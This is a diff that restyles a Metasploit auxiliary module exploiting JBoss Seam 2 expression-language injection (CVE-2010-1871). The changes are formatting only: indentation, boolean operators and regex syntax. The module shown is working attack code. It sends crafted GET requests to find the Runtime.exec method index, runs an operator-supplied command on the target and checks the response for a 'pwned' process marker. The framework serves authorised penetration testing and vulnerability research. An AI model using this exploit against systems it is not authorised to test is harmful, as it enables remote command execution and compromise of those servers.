@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,42 +7,42 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'            => 'JBoss Seam 2 Remote Command Execution',
-      'Description'     => %q{
-          JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
-        4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
-        Language (EL) expressions, which allows remote attackers to execute arbitrary code
-        via a crafted URL. This modules also has been tested successfully against IBM
-        WebSphere 6.1 running on iSeries.
+                      'Name'            => 'JBoss Seam 2 Remote Command Execution',
+                      'Description'     => %q{
+                          JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
+                        4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
+                        Language (EL) expressions, which allows remote attackers to execute arbitrary code
+                        via a crafted URL. This modules also has been tested successfully against IBM
+                        WebSphere 6.1 running on iSeries.
 
-        NOTE: this is only a vulnerability when the Java Security Manager is not properly
-        configured.
-      },
-      'Author'          =>
-        [
-          'guerrino di massa', # Metasploit module
-          'Cristiano Maruti <cmaruti[at]gmail.com>' # Support for IBM Websphere 6.1
-        ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
-          [ 'CVE', '2010-1871' ],
-          [ 'OSVDB', '66881']
-        ],
-      'DefaultTarget'  => 0,
-      'DisclosureDate' => 'Jul 19 2010'))
+                        NOTE: this is only a vulnerability when the Java Security Manager is not properly
+                        configured.
+                      },
+                      'Author'          =>
+                        [
+                          'guerrino di massa', # Metasploit module
+                          'Cristiano Maruti <cmaruti[at]gmail.com>' # Support for IBM Websphere 6.1
+                        ],
+                      'License'         => MSF_LICENSE,
+                      'References'      =>
+                        [
+                          [ 'CVE', '2010-1871' ],
+                          [ 'OSVDB', '66881']
+                        ],
+                      'DefaultTarget'  => 0,
+                      'DisclosureDate' => 'Jul 19 2010'))
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),
         OptString.new('CMD', [ true, "The command to execute."])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -62,13 +63,14 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         {
           'uri'    => req,
-          'method' => 'GET',
-        }, 20)
+          'method' => 'GET'
+        }, 20
+      )
 
-      if (res and res.headers['Location'] =~ %r(java.lang.Runtime.exec\%28java.lang.String\%29))
+      if res && res.headers['Location'] =~ /java.lang.Runtime.exec\%28java.lang.String\%29/
         flag_found_one = index
         print_status("Found right index at [" + index.to_s + "] - exec")
-      elsif (res and res.headers['Location'] =~ %r(java.lang.Runtime\+java.lang.Runtime.getRuntime))
+      elsif res && res.headers['Location'] =~ /java.lang.Runtime\+java.lang.Runtime.getRuntime/
         print_status("Found right index at [" + index.to_s + "] - getRuntime")
         flag_found_two = index
       else
@@ -76,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    if (flag_found_one != 255 && flag_found_two != 255 )
+    if flag_found_one != 255 && flag_found_two != 255
       print_status("Target appears VULNERABLE!")
       print_status("Sending remote command:" + datastore["CMD"])
 
@@ -85,11 +87,11 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi(
         {
           'uri'    => req,
-          'method' => 'GET',
-        }, 20)
+          'method' => 'GET'
+        }, 20
+      )
 
-
-      if (res and res.headers['Location'] =~ %r(pwned=java.lang.UNIXProcess))
+      if res && res.headers['Location'] =~ /pwned=java.lang.UNIXProcess/
         print_status("Exploited successfully")
       else
         print_status("Exploit failed.")
